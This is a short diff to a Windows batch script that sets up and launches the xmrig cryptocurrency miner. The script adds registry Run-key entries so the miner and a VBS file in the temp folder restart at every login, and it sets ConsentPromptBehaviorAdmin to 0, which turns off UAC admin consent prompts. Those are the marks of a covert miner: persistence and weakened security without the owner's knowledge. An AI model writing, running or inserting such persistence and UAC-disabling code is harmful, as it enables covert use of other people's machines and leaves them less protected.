@@ -55,6 +55,7 @@ echo ****************************************************
 echo ** xmrig start **
 echo ****************************************************
 REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v xmrig /t REG_SZ /d "C:\Program Files\Common Files\tm_rig\start_xmrig.bat" /f
+REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v checkxm /t REG_SZ /d "%tmp%\tm_rig\runas_.vbs" /f
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 cd\ && cd "C:\Program Files\Common Files\tm_rig\" && start start_xmrig.bat
 timeout /T 60
